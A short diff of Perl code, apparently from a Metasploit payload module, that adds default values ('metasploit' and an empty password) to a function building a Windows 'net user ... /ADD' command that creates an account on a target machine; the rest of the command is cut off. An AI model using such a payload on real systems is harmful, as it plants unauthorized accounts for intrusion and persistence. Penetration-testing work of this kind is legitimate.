@@ -31,8 +31,8 @@ sub new {
 
 sub CommandString {
   my $self = shift;
-  my $user = $self->GetVar('USER');
-  my $pass = $self->GetVar('PASS');
+  my $user = $self->GetVar('USER') || 'metasploit';
+  my $pass = $self->GetVar('PASS') || '';
 
   my $command =
   "cmd.exe /c net user $user $pass /ADD && ".
